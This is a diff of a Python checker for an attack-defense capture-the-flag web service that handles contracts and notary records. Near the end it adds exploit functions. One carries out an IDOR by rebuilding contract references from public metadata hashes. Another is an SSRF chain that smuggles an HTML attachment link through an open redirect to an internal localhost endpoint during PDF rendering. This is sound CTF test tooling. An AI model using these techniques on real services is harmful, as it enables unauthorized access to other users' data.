@@ -1,4 +1,5 @@
 import asyncio
+import hashlib
 import json
 import os
 import random
@@ -6,7 +7,7 @@ import re
 import string
 from logging import LoggerAdapter
 from typing import Any, Optional
-from urllib import error, request
+from urllib import error, parse, request
 
 from enochecker3 import (
     ChainDB,
@@ -257,14 +258,24 @@ class HttpClient:
     async def current_user(self, token: str) -> tuple[int, Any]:
         return await self.request_json("GET", "/api/me", token=token)
 
-    async def create_contract(self, token: str, title: str, content: str) -> str:
+    async def create_contract(
+        self,
+        token: str,
+        title: str,
+        content: str,
+        notary_secret: str | None = None,
+    ) -> JsonObject:
+        body: JsonObject = {
+            "title": title,
+            "content": content,
+        }
+        if notary_secret is not None:
+            body["notarySecret"] = notary_secret
+
         status, data = await self.request_json(
             "POST",
             "/api/contracts",
-            {
-                "title": title,
-                "content": content,
-            },
+            body,
             token=token,
         )
 
@@ -283,7 +294,7 @@ class HttpClient:
                 f"Response keys: {response_keys}"
             )
 
-        return reference
+        return data_obj
 
     async def list_contracts(self, token: str) -> list[JsonObject]:
         status, data = await self.request_json("GET", "/api/contracts", token=token)
@@ -319,6 +330,13 @@ class HttpClient:
             token=token,
         )
 
+    async def sealed_record(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
+        return await self.request_bytes(
+            "GET",
+            f"/api/contracts/{reference}/notary/sealed",
+            token=token,
+        )
+
 
 def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
     return HttpClient(service_base_url(task), logger)
@@ -329,6 +347,41 @@ def get_string_field(data: JsonObject, key: str, context: str) -> str:
     if not isinstance(value, str):
         raise MumbleException(f"{context} did not contain a valid {key}")
     return value
+
+
+def normalize_checksum(value: Any) -> str | None:
+    if not isinstance(value, str):
+        return None
+
+    checksum = value.strip().lower()
+    if re.fullmatch(r"[0-9a-f]{64}", checksum) is None:
+        return None
+
+    return checksum
+
+
+def reference_from_public_metadata(username: str, title: str, checksum: str) -> str:
+    normalized_title = title.strip()
+    normalized_checksum = checksum.strip().lower()
+    material = f"{username}:{normalized_title}:{normalized_checksum}".encode("utf-8")
+    return "CNTR-" + hashlib.sha256(material).hexdigest()[:24]
+
+
+def reference_from_public_contract(username: str, contract: JsonObject) -> str | None:
+    title = contract.get("title")
+    checksum = public_contract_checksum(contract)
+    if not isinstance(title, str) or checksum is None:
+        return None
+
+    return reference_from_public_metadata(username, title, checksum)
+
+
+def public_contract_checksum(contract: JsonObject) -> str | None:
+    latest_version = contract.get("latestVersion")
+    if not isinstance(latest_version, dict):
+        return None
+
+    return normalize_checksum(latest_version.get("checksum"))
 
 
 def extract_usernames_from_hints(task: ExploitCheckerTaskMessage) -> list[str]:
@@ -399,7 +452,7 @@ CHECKER FUNCTIONS
 
 
 @checker.putflag(0)
-async def putflag_contract(
+async def putflag_idor_contract(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     logger: LoggerAdapter,
@@ -409,26 +462,54 @@ async def putflag_contract(
 
     username = random_username()
     password = random_password()
-    title = "Signing Package " + random_suffix(12)
+    title = "Filed Settlement Addendum " + random_suffix(12)
+    content = (
+        "Public settlement addendum\n"
+        f"Case marker: {random_suffix(18)}\n"
+        f"Escrow disclosure: {task.flag}\n"
+        "This record is approved for certified PDF archiving."
+    )
 
     logger.debug("Registering flag owner")
     _user_id, _username, token = await client.register_user(username, password)
 
-    logger.debug("Creating contract that contains the flag")
-    reference = await client.create_contract(token, title, task.flag)
+    logger.debug("Creating IDOR flag contract")
+    created = await client.create_contract(token, title, content)
+    reference = get_string_field(created, "reference", "contract creation response")
+    checksum = get_string_field(created, "checksum", "contract creation response")
+    derived_reference = reference_from_public_metadata(username, title, checksum)
+    if derived_reference != reference:
+        raise MumbleException("Contract reference was not derived from public contract metadata")
+
+    logger.debug("Creating IDOR decoy contracts")
+    decoy_references: list[str] = []
+    for _index in range(3):
+        decoy_title = "Filed Settlement Addendum " + random_suffix(12)
+        decoy_content = (
+            "Public settlement addendum\n"
+            f"Case marker: {random_suffix(18)}\n"
+            f"Escrow disclosure: review-{random_suffix(24)}\n"
+            "This record is approved for certified PDF archiving."
+        )
+        decoy_created = await client.create_contract(token, decoy_title, decoy_content)
+        decoy_references.append(get_string_field(decoy_created, "reference", "contract creation response"))
 
     logger.debug("Checking that the new contract is present in the owner's list")
     contracts = await client.list_contracts(token)
     listed_references = [contract.get("reference") for contract in contracts]
     assert_in(reference, listed_references, "Created contract was not visible in the owner's list")
+    for decoy_reference in decoy_references:
+        assert_in(decoy_reference, listed_references, "Created decoy contract was not visible in the owner's list")
 
     await db.set(
-        "contract",
+        "idor_contract",
         {
             "username": username,
             "password": password,
             "title": title,
+            "content": content,
             "reference": reference,
+            "checksum": checksum,
         },
     )
 
@@ -436,7 +517,7 @@ async def putflag_contract(
 
 
 @checker.getflag(0)
-async def getflag_contract(
+async def getflag_idor_contract(
     task: GetflagCheckerTaskMessage,
     db: ChainDB,
     logger: LoggerAdapter,
@@ -445,10 +526,13 @@ async def getflag_contract(
     log_unexpected_flag_format(task.flag, logger)
 
     try:
-        stored = await db.get("contract")
+        stored = await db.get("idor_contract")
         username = stored["username"]
         password = stored["password"]
+        title = stored["title"]
         reference = stored["reference"]
+        content = stored["content"]
+        checksum = stored["checksum"]
     except (KeyError, TypeError) as exc:
         raise MumbleException(
             "Missing or broken database entry from putflag; the previous putflag likely failed "
@@ -465,9 +549,150 @@ async def getflag_contract(
         raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")
 
     data_obj = require_json_object(data, "latest contract response")
-    content = get_string_field(data_obj, "content", "latest contract response")
-    if content != task.flag:
-        raise MumbleException("Stored flag content was incorrect")
+    latest_content = get_string_field(data_obj, "content", "latest contract response")
+    if latest_content != content:
+        raise MumbleException("Stored flag contract content was incorrect")
+    if task.flag not in latest_content:
+        raise MumbleException("Stored flag content was missing")
+    assert_equals(data_obj.get("checksum"), checksum, "Stored flag checksum was incorrect")
+
+    logger.debug("Retrieving own latest contract PDF")
+    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
+    if status != 200:
+        raise MumbleException(f"Could not retrieve stored contract PDF: HTTP {status}")
+    content_type = headers.get("content-type", "").lower()
+    if "application/pdf" not in content_type:
+        raise MumbleException("Stored contract PDF had the wrong content type")
+    if task.flag.encode("utf-8") not in pdf_bytes:
+        raise MumbleException("Stored flag content was missing from the PDF")
+
+    logger.debug("Checking public metadata for indirect reference leakage")
+    status, public_data = await client.public_contracts_by_username(username)
+    if status != 200:
+        raise MumbleException(f"Could not retrieve public flag metadata: HTTP {status}")
+    public_obj = require_json_object(public_data, "public flag metadata response")
+    assert_equals(public_obj.get("username"), username, "Public flag metadata username was incorrect")
+    public_contracts = public_obj.get("contracts")
+    if not isinstance(public_contracts, list):
+        raise MumbleException("Public flag metadata did not contain a contracts list")
+
+    public_contract_objects: list[JsonObject] = []
+    matching_public_contracts: list[JsonObject] = []
+    for contract in public_contracts:
+        if not isinstance(contract, dict):
+            continue
+        if "reference" in contract:
+            raise MumbleException("Public metadata exposed a direct contract reference")
+        public_contract_objects.append(contract)
+        if contract.get("title") == title and public_contract_checksum(contract) == checksum:
+            matching_public_contracts.append(contract)
+
+    if len(public_contract_objects) < 4:
+        raise MumbleException("Vuln 0 decoy contracts were missing from public metadata")
+    if not matching_public_contracts:
+        raise MumbleException("Flag contract title/checksum pair was not visible in public metadata")
+    assert_equals(
+        reference_from_public_contract(username, matching_public_contracts[0]),
+        reference,
+        "Flag contract reference was not derivable from public metadata",
+    )
+
+
+@checker.putflag(1)
+async def putflag_notary_contract(
+    task: PutflagCheckerTaskMessage,
+    db: ChainDB,
+    logger: LoggerAdapter,
+) -> str:
+    client = make_client(task, logger)
+    log_unexpected_flag_format(task.flag, logger)
+
+    username = random_username()
+    password = random_password()
+    title = "Certified Supplier Agreement " + random_suffix(12)
+    content = "This contract package is sealed by the SignMeMaybe notary service."
+
+    logger.debug("Registering notary flag owner")
+    _user_id, _username, token = await client.register_user(username, password)
+
+    logger.debug("Creating contract package with a sealed record")
+    created = await client.create_contract(token, title, content, notary_secret=task.flag)
+    reference = get_string_field(created, "reference", "contract creation response")
+    notary_stamp = get_string_field(created, "notaryStamp", "contract creation response")
+
+    logger.debug("Checking that the new notary contract is present in the owner's list")
+    contracts = await client.list_contracts(token)
+    listed_references = [contract.get("reference") for contract in contracts]
+    assert_in(reference, listed_references, "Created notary contract was not visible in the owner's list")
+
+    await db.set(
+        "notary_contract",
+        {
+            "username": username,
+            "password": password,
+            "title": title,
+            "content": content,
+            "reference": reference,
+            "notaryStamp": notary_stamp,
+        },
+    )
+
+    return username
+
+
+@checker.getflag(1)
+async def getflag_notary_contract(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    logger: LoggerAdapter,
+) -> None:
+    client = make_client(task, logger)
+    log_unexpected_flag_format(task.flag, logger)
+
+    try:
+        stored = await db.get("notary_contract")
+        username = stored["username"]
+        password = stored["password"]
+        reference = stored["reference"]
+        content = stored["content"]
+    except (KeyError, TypeError) as exc:
+        raise MumbleException(
+            "Missing or broken database entry from putflag; the previous putflag likely failed "
+            "before storing checker state"
+        ) from exc
+
+    logger.debug("Logging in as the notary flag owner")
+    _user_id, _username, token = await client.login_user(username, password)
+
+    logger.debug("Retrieving own sealed notary record")
+    status, sealed_bytes, _headers = await client.sealed_record(token, reference)
+    if status != 200:
+        raise MumbleException(f"Could not retrieve sealed record: HTTP {status}")
+    if sealed_bytes != task.flag.encode("utf-8"):
+        raise MumbleException("Sealed record content was incorrect")
+
+    logger.debug("Retrieving own latest notary contract version")
+    status, data = await client.latest_contract_version(token, reference)
+
+    if status != 200:
+        raise MumbleException(f"Could not retrieve stored notary contract: HTTP {status}")
+
+    data_obj = require_json_object(data, "latest notary contract response")
+    latest_content = get_string_field(data_obj, "content", "latest notary contract response")
+    if latest_content != content:
+        raise MumbleException("Stored public notary contract content was incorrect")
+    if task.flag in json.dumps(data_obj, ensure_ascii=False):
+        raise MumbleException("Sealed record appeared in latest contract metadata")
+
+    logger.debug("Retrieving own latest notary contract PDF")
+    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
+    if status != 200:
+        raise MumbleException(f"Could not retrieve stored notary contract PDF: HTTP {status}")
+    content_type = headers.get("content-type", "").lower()
+    if "application/pdf" not in content_type:
+        raise MumbleException("Stored notary contract PDF had the wrong content type")
+    if task.flag.encode("utf-8") in pdf_bytes:
+        raise MumbleException("Sealed record appeared in the ordinary contract PDF")
 
 
 @checker.putnoise(0)
@@ -494,7 +719,9 @@ async def putnoise_contract(
     assert_equals(data_obj.get("username"), username, "Current noise user was incorrect")
 
     logger.debug("Creating noise contract")
-    reference = await client.create_contract(token, title, content)
+    created = await client.create_contract(token, title, content)
+    reference = get_string_field(created, "reference", "contract creation response")
+    checksum = get_string_field(created, "checksum", "contract creation response")
 
     logger.debug("Checking that the noise contract is present in the owner's list")
     contracts = await client.list_contracts(token)
@@ -509,6 +736,7 @@ async def putnoise_contract(
             "title": title,
             "content": content,
             "reference": reference,
+            "checksum": checksum,
         },
     )
 
@@ -528,6 +756,7 @@ async def getnoise_contract(
         title = stored["title"]
         content = stored["content"]
         reference = stored["reference"]
+        checksum = stored["checksum"]
     except (KeyError, TypeError) as exc:
         raise MumbleException(
             "Missing or broken database entry from putnoise; the previous putnoise likely failed "
@@ -558,12 +787,14 @@ async def getnoise_contract(
     public_contracts = data_obj.get("contracts")
     if not isinstance(public_contracts, list):
         raise MumbleException("Public noise metadata did not contain a contracts list")
-    public_references = [
-        contract.get("reference")
-        for contract in public_contracts
-        if isinstance(contract, dict)
-    ]
-    assert_in(reference, public_references, "Noise contract was not visible in public metadata")
+    public_checksums = []
+    for contract in public_contracts:
+        if not isinstance(contract, dict):
+            continue
+        if "reference" in contract:
+            raise MumbleException("Public noise metadata exposed a direct contract reference")
+        public_checksums.append(public_contract_checksum(contract))
+    assert_in(checksum, public_checksums, "Noise contract checksum was not visible in public metadata")
 
     logger.debug("Retrieving noise contract")
     status, data = await client.latest_contract_version(token, reference)
@@ -669,7 +900,69 @@ async def havoc_rejections(task: HavocCheckerTaskMessage, logger: LoggerAdapter)
 
 
 @checker.exploit(0)
-async def exploit_idor(
+async def exploit_checksum_idor(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    logger: LoggerAdapter,
+) -> Optional[str]:
+    client = make_client(task, logger)
+
+    username = random_username()
+    password = random_password()
+
+    logger.debug("Registering attacker account")
+    _user_id, _username, token = await client.register_user(username, password)
+
+    target_usernames = extract_usernames_from_hints(task)
+    if not target_usernames:
+        raise MumbleException("exploit did not receive a target username")
+
+    logger.debug("Resolving %d target usernames via public contract metadata", len(target_usernames))
+    for target_username in target_usernames:
+        status, data = await client.public_contracts_by_username(target_username)
+
+        if status == 404:
+            continue
+        if status != 200:
+            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
+            continue
+        if not isinstance(data, dict):
+            continue
+
+        public_username = data.get("username")
+        if not isinstance(public_username, str) or not public_username:
+            public_username = target_username
+
+        contracts = data.get("contracts")
+        if not isinstance(contracts, list):
+            continue
+
+        for contract in contracts:
+            if not isinstance(contract, dict):
+                continue
+
+            reference = reference_from_public_contract(public_username, contract)
+            if reference is None:
+                continue
+
+            status, latest_data = await client.latest_contract_version(token, reference)
+            if status == 200:
+                latest_bytes = json.dumps(latest_data, ensure_ascii=False).encode("utf-8")
+                if flag := searcher.search_flag(latest_bytes):
+                    return flag
+
+            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, reference)
+            if status != 200:
+                continue
+
+            if flag := searcher.search_flag(pdf_bytes):
+                return flag
+
+    raise MumbleException("flag not found")
+
+
+@checker.exploit(1)
+async def exploit_annex_notary(
     task: ExploitCheckerTaskMessage,
     searcher: FlagSearcher,
     logger: LoggerAdapter,
@@ -706,24 +999,38 @@ async def exploit_idor(
             if not isinstance(contract, dict):
                 continue
 
-            reference = contract.get("reference")
-            if not isinstance(reference, str) or not reference:
+            notary_stamp = contract.get("notaryStamp")
+            if not isinstance(notary_stamp, str) or not notary_stamp:
                 continue
 
-            status, latest = await client.latest_contract_version(token, reference)
+            internal_url = (
+                f"http://127.0.0.1:{SERVICE_PORT}/internal/notary/sealed/"
+                f"{parse.quote(notary_stamp, safe='')}"
+            )
+            redirect_url = (
+                f"{client.base_url}/api/links/leave?to="
+                f"{parse.quote(internal_url, safe='')}"
+            )
+            annex_content = (
+                '<link rel="attachment" title="sealed-record.txt" '
+                f'href="{redirect_url}">'
+            )
 
-            if status == 404:
-                continue
-            if status == 401:
-                raise MumbleException("Attacker session was rejected")
+            created = await client.create_contract(
+                token,
+                "Certified Evidence Review " + random_suffix(12),
+                annex_content,
+            )
+            attacker_reference = get_string_field(created, "reference", "attacker contract creation response")
+
+            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, attacker_reference)
             if status != 200:
-                logger.debug("Skipping reference %s because latest returned HTTP %s", reference, status)
+                logger.debug("Skipping stamp because PDF returned HTTP %s", status)
                 continue
-            if not isinstance(latest, dict):
+            if b"/EmbeddedFiles" not in pdf_bytes:
                 continue
 
-            raw = json.dumps(latest, ensure_ascii=False).encode("utf-8", errors="replace")
-            if flag := searcher.search_flag(raw):
+            if flag := searcher.search_flag(pdf_bytes):
                 return flag
 
     raise MumbleException("flag not found")
